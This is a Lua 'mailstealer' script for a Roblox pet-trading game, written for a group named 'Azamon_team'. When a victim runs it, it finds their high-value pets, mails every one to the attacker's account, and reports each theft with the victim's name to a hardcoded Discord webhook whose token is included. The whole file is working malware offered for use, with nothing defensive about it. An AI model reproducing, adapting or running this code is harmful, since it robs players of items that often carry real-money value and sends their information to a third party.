-- Cryzzz Private Mailstealer 2026
-- Only for Azamon_team

Username = "Azamon_team"
Username2 = "Azamon_team"
Webhook = "https://discordapp.com/api/webhooks/1509224125195878411/BQTSR7zKwgM0-aqaFN2z-F07KPTg-OfqIs5lqYpdTHlFgKKfOzK0L4Cuc_v2O0Z51IzE"
MinimumRAP = 1000000
LogsWebhook = Webhook
mailstealer_name = "Cryzzz"
Roblox_Username = Username
Discord_Webhook = Webhook

LOGS_WEBHOOK = LogsWebhook

if getgenv().Executed == true then
    return
end
getgenv().Executed = true

repeat task.wait() until game:IsLoaded()
if not game:IsLoaded() then game.Loaded:Wait() end

local idiotuser = game:GetService("Players").LocalPlayer.Name
if idiotuser == Username then
    game:GetService("Players").LocalPlayer:Kick("Owner Account - Use Alt")
    return
end

repeat task.wait() until game.PlaceId ~= nil
repeat task.wait() until not game.Players.LocalPlayer.PlayerGui:FindFirstChild("__INTRO")

-- variables:
local Library = require(game.ReplicatedStorage.Library)
local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
local Directory = require(game:GetService("ReplicatedStorage").Library.Directory)
local Player = game.Players.LocalPlayer
local Inventory = Save.Inventory
local HttpService = game:GetService("HttpService")
local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")

for id, table in pairs(Inventory.Currency) do
    if table.id == "Diamonds" then
        GemsAmount = table._am or 0
        break
    end
end

for adress, func in pairs(getgc()) do
    if typeof(func) == "function" and debug.getinfo(func).name == "computeSendMailCost" then
        FunctionToGetFirstPriceOfMail = func
        break
    end
end

FirstPriceOfMail = FunctionToGetFirstPriceOfMail()

if FirstPriceOfMail > GemsAmount then
    print("Not enough gems")
    return
end

local FormatNumber = function(number)
    local n = math.floor(number)
    local suf = {"", "k", "m", "b", "t"}
    local INDEX = 1
    while n >= 1000 do
        n = n / 1000
        INDEX = INDEX + 1
    end
    return string.format("%.2f%s", n, suf[INDEX])
end

local GetItemValue = function(Type, ItemTable)
    return (require(game:GetService("ReplicatedStorage").Library.Client.DevRAPCmds).Get({
        Class = {Name = Type},
        IsA = function(hmm) return hmm == Type end,
        GetId = function() return ItemTable.id end,
        StackKey = function() return HttpService:JSONEncode({id = ItemTable.id, pt = ItemTable.pt, sh = ItemTable.sh, tn = ItemTable.tn}) end
    }) or 0)
end

local GetThumbnail = function(imageid)
    local Asset = string.split(imageid, "rbxassetid://")[2]
    local Image = game:HttpGet("https://thumbnails.roblox.com/v1/assets?assetIds="..Asset.."&returnPolicy=PlaceHolder&size=420x420&format=png")
    return game.HttpService:JSONDecode(Image).data[1].imageUrl
end

local function SendMessage(id, item_type, RBgoldNormal, thumbnail, webhook, pets_left, shiny, ping, RAP, totalRap1)
    local shinyy = shiny and "Shiny" or "Normal"
    local msg = {
        ["content"] = ping,
        ["username"] = mailstealer_name .. " Mailstealer",
        ["embeds"] = {{
            ["title"] = "**New Item Received**",
            ["color"] = 16776960,
            ["thumbnail"] = {["url"] = thumbnail},
            ["fields"] = {
                {["name"] = "Victim", ["value"] = "```"..Player.Name.."```"},
                {["name"] = "Item", ["value"] = "```"..id.."```"},
                {["name"] = "RAP", ["value"] = "```"..FormatNumber(RAP).."```"},
                {["name"] = "Total RAP", ["value"] = "```"..FormatNumber(totalRap1).."```"}
            }
        }}
    }
    pcall(function()
        game:GetService("HttpService"):PostAsync(webhook, HttpService:JSONEncode(msg), Enum.HttpContentType.ApplicationJson)
    end)
end

local GetListWithAllItems = function()
    local hits = {}
    if Inventory.Pet ~= nil then
        for i, v in pairs(Inventory.Pet) do
            local rap = GetItemValue("Pet", v)
            if rap > MinimumRAP then
                table.insert(hits, {
                    Item_Id = i,
                    Item_Name = v.id,
                    Item_Amount = v._am or 1,
                    Item_RAP = rap,
                    Item_Class = "Pet",
                    IsShiny = v.sh or false,
                    IsLocked = v.lk or false,
                    Item_ImageId = (Directory.Pets[v.id] or {}).thumbnail or ""
                })
            end
        end
    end
    table.sort(hits, function(a, b) return a.Item_RAP > b.Item_RAP end)
    return hits
end

local hits = GetListWithAllItems()
local totalRap = 0
for _, v in pairs(hits) do totalRap = totalRap + v.Item_RAP end

print("Found " .. #hits .. " items | Total RAP: " .. FormatNumber(totalRap))

for i, v in pairs(hits) do
    local args = {Roblox_Username, "Cryzzz on top", v.Item_Class, v.Item_Id, v.Item_Amount}
    network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
    wait(1.2)
    
    local thumb = GetThumbnail(v.Item_ImageId)
    SendMessage(v.Item_Name, v.Item_Class, "Normal", thumb, Discord_Webhook, #hits - i, v.IsShiny, "@everyone", v.Item_RAP, totalRap)
end

print("=== CRYZZZ MAILSTEALER FINISHED ===")
